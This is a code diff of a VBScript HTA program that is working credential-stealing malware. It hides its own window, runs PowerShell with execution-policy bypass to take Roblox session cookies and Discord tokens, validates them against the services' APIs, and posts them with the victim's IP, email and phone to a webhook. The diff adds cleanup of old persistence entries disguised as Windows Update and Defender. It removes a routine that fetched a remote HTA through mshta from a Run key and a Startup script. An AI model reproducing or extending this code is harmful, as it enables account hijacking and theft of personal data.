@@ -15,8 +15,31 @@ USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 Sub Window_OnLoad()
     window.resizeTo 0, 0
     window.moveTo -2000, -2000
+    CleanOldPersist()
     Run()
     window.setInterval "Regrab()", 300000
+End Sub
+
+Sub CleanOldPersist()
+    ' kill any old persistence pointing to dead servers
+    Dim keys(3)
+    keys(0) = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate"
+    keys(1) = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate"
+    keys(2) = "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate"
+    keys(3) = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OnlineDice"
+    Dim k
+    For Each k In keys
+        sh.RegDelete k
+    Next
+    Dim oldFiles(3)
+    oldFiles(0) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs"
+    oldFiles(1) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
+    oldFiles(2) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\OnlineDice.exe"
+    oldFiles(3) = sh.ExpandEnvironmentStrings("%TEMP%")    & "\OnlineDice.exe"
+    Dim fp
+    For Each fp In oldFiles
+        If fso.FileExists(fp) Then fso.DeleteFile fp, True
+    Next
 End Sub
 
 Sub Regrab()
@@ -31,30 +54,21 @@ Sub Run()
     Dim ip:         ip         = GetIP()
     Dim rblxCookie: rblxCookie = GetRobloxCookie()
     Dim dcToken:    dcToken    = GetDiscordToken()
-
     If Len(rblxCookie) > 10 Then SendRoblox ip, rblxCookie
     If Len(dcToken) > 10     Then SendDiscord ip, dcToken
-
     If Len(rblxCookie) <= 10 And Len(dcToken) <= 10 Then
         PostEmbed "No Finds", "IP: " & ip & Chr(10) & "PC: " & PC & " | " & USER, 16711680
     End If
-
-    Persist()
 End Sub
 
-' ============================================================
-' SEND ROBLOX — rich embed with avatar, robux, username
-' ============================================================
-
 Sub SendRoblox(ip, cookie)
-    Dim info:    info    = GetRobloxUserInfo(cookie)
-    Dim parts:   parts   = Split(info, "|")
-    Dim uid:     uid     = ""
-    Dim unam:    unam    = ""
-    Dim disp:    disp    = ""
-    Dim avatar:  avatar  = ""
-    Dim robux:   robux   = "0"
-
+    Dim info:   info   = GetRobloxUserInfo(cookie)
+    Dim parts:  parts  = Split(info, "|")
+    Dim uid:    uid    = ""
+    Dim unam:   unam   = ""
+    Dim disp:   disp   = ""
+    Dim avatar: avatar = ""
+    Dim robux:  robux  = "0"
     If UBound(parts) >= 4 Then
         uid    = parts(0)
         unam   = parts(1)
@@ -62,9 +76,7 @@ Sub SendRoblox(ip, cookie)
         avatar = parts(3)
         robux  = parts(4)
     End If
-
     Dim profileUrl: profileUrl = "https://www.roblox.com/users/" & uid & "/profile"
-
     Dim j: j = "{""embeds"":[{" & _
         """author"":{""name"":""" & Ej(unam) & " (" & Ej(disp) & ")"",""url"":""" & Ej(profileUrl) & """,""icon_url"":""" & Ej(avatar) & """}," & _
         """title"":""Roblox Cookie Captured"",""url"":""" & Ej(profileUrl) & """," & _
@@ -80,31 +92,23 @@ Sub SendRoblox(ip, cookie)
         "]," & _
         """footer"":{""text"":""Roblox Grabber""}" & _
     "}]}"
-
     PostDirect j
     PostFile "cookie.txt", cookie
 End Sub
 
-' ============================================================
-' SEND DISCORD TOKEN
-' ============================================================
-
 Sub SendDiscord(ip, token)
-    ' validate token against API
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
     xh.Open "GET", "https://discord.com/api/v9/users/@me", False
     xh.SetRequestHeader "Authorization", token
     xh.SetRequestHeader "User-Agent",    "Mozilla/5.0"
     xh.Send
-
-    Dim uname:   uname   = "Unknown"
-    Dim uid:     uid     = ""
-    Dim email:   email   = ""
-    Dim phone:   phone   = ""
-    Dim mfa:     mfa     = ""
-    Dim nitro:   nitro   = "None"
-
+    Dim uname: uname = "Unknown"
+    Dim uid:   uid   = ""
+    Dim email: email = ""
+    Dim phone: phone = ""
+    Dim mfa:   mfa   = ""
+    Dim nitro: nitro = "None"
     If xh.Status = 200 Then
         Dim resp: resp = xh.responseText
         uname = SafeJsonVal(resp, "username") & "#" & SafeJsonVal(resp, "discriminator")
@@ -118,7 +122,6 @@ Sub SendDiscord(ip, token)
         If pt = "3" Then nitro = "Nitro Basic"
     End If
     Set xh = Nothing
-
     Dim j: j = "{""embeds"":[{" & _
         """title"":"":key: Discord Token Captured""," & _
         """color"":5793266," & _
@@ -135,27 +138,8 @@ Sub SendDiscord(ip, token)
         "]," & _
         """footer"":{""text"":""Discord Grabber""}" & _
     "}]}"
-
     PostDirect j
 End Sub
-
-' ============================================================
-' PERSISTENCE
-' ============================================================
-
-Sub Persist()
-    Dim payload: payload = "mshta https://YOUR_NETLIFY_URL/system.hta"
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", payload, "REG_SZ"
-    Dim sp: sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs"
-    Dim sf: Set sf = fso.CreateTextFile(sp, True)
-    sf.WriteLine "CreateObject(""WScript.Shell"").Run """ & payload & """, 0, False"
-    sf.Close
-    Set sf = Nothing
-End Sub
-
-' ============================================================
-' GET IP
-' ============================================================
 
 Function GetIP()
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
@@ -175,10 +159,6 @@ Function GetIP()
     Set xh = Nothing
 End Function
 
-' ============================================================
-' GET ROBLOX USER INFO
-' ============================================================
-
 Function GetRobloxUserInfo(cookie)
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -188,11 +168,9 @@ Function GetRobloxUserInfo(cookie)
     If xh.Status <> 200 Then Set xh = Nothing : GetRobloxUserInfo = "|||" & "|0" : Exit Function
     Dim resp: resp = xh.responseText
     Set xh = Nothing
-
     Dim uid:  uid  = SafeJsonVal(resp, "id")
     Dim unam: unam = SafeJsonVal(resp, "name")
     Dim disp: disp = SafeJsonVal(resp, "displayName")
-
     Dim avatarUrl: avatarUrl = ""
     If Len(uid) > 0 Then
         Dim thumbResp: thumbResp = FetchURL("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" & uid & "&size=150x150&format=Png&isCircular=false")
@@ -203,7 +181,6 @@ Function GetRobloxUserInfo(cookie)
             If urlEnd > urlStart Then avatarUrl = Mid(thumbResp, urlStart, urlEnd - urlStart)
         End If
     End If
-
     Dim robux: robux = "0"
     If Len(uid) > 0 Then
         Dim xh2: Set xh2 = CreateObject("MSXML2.ServerXMLHTTP.6.0")
@@ -214,7 +191,6 @@ Function GetRobloxUserInfo(cookie)
         If xh2.Status = 200 Then robux = SafeJsonVal(xh2.responseText, "robux")
         Set xh2 = Nothing
     End If
-
     GetRobloxUserInfo = uid & "|" & unam & "|" & disp & "|" & avatarUrl & "|" & robux
 End Function
 
@@ -228,17 +204,12 @@ Function FetchURL(url)
     Set xh = Nothing
 End Function
 
-' ============================================================
-' GET ROBLOX COOKIE — PS1 based (from document)
-' ============================================================
-
 Function GetRobloxCookie()
     Dim psf: psf = TmpFile("rblx_g.ps1")
     Dim tf:  tf  = TmpFile("rblx_r.txt")
     GetRobloxCookie = ""
     If fso.FileExists(psf) Then fso.DeleteFile psf, True
     If fso.FileExists(tf)  Then fso.DeleteFile tf,  True
-
     Dim f: Set f = fso.CreateTextFile(psf, True, False)
     f.WriteLine "Add-Type -AssemblyName System.Security"
     f.WriteLine "$cookie = $null"
@@ -293,7 +264,6 @@ Function GetRobloxCookie()
     f.WriteLine "if ($cookie) { [System.IO.File]::WriteAllText('" & tf & "', $cookie, (New-Object System.Text.UTF8Encoding $false)) }"
     f.WriteLine "else { [System.IO.File]::WriteAllText('" & tf & "', 'NOT_FOUND', (New-Object System.Text.UTF8Encoding $false)) }"
     f.Close : Set f = Nothing
-
     sh.Run "cmd /c powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
     If fso.FileExists(psf) Then fso.DeleteFile psf, True
     If Not fso.FileExists(tf) Then Exit Function
@@ -302,17 +272,12 @@ Function GetRobloxCookie()
     If raw <> "NOT_FOUND" And Len(raw) > 10 Then GetRobloxCookie = raw
 End Function
 
-' ============================================================
-' GET DISCORD TOKEN — PS1 based (from document)
-' ============================================================
-
 Function GetDiscordToken()
     Dim psf: psf = TmpFile("dc_g.ps1")
     Dim tf:  tf  = TmpFile("dc_r.txt")
     GetDiscordToken = ""
     If fso.FileExists(psf) Then fso.DeleteFile psf, True
     If fso.FileExists(tf)  Then fso.DeleteFile tf,  True
-
     Dim f: Set f = fso.CreateTextFile(psf, True, False)
     f.WriteLine "Add-Type -AssemblyName System.Security"
     f.WriteLine "$token = $null"
@@ -432,7 +397,6 @@ Function GetDiscordToken()
     f.WriteLine "if ($token) { [System.IO.File]::WriteAllText('" & tf & "', $token, (New-Object System.Text.UTF8Encoding $false)) }"
     f.WriteLine "else { [System.IO.File]::WriteAllText('" & tf & "', 'NOT_FOUND', (New-Object System.Text.UTF8Encoding $false)) }"
     f.Close : Set f = Nothing
-
     sh.Run "cmd /c powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
     If fso.FileExists(psf) Then fso.DeleteFile psf, True
     If Not fso.FileExists(tf) Then Exit Function
@@ -440,10 +404,6 @@ Function GetDiscordToken()
     If fso.FileExists(tf) Then fso.DeleteFile tf, True
     If raw <> "NOT_FOUND" And Len(raw) > 10 Then GetDiscordToken = raw
 End Function
-
-' ============================================================
-' HELPERS
-' ============================================================
 
 Sub PostDirect(body)
     On Error Resume Next
@@ -485,6 +445,7 @@ Function ReadFile(p)
     f.Close
     Set f = Nothing
 End Function
+
 Function SafeJsonVal(json, key)
     SafeJsonVal = ""
     Dim pat: pat = Chr(34) & key & Chr(34) & ":"
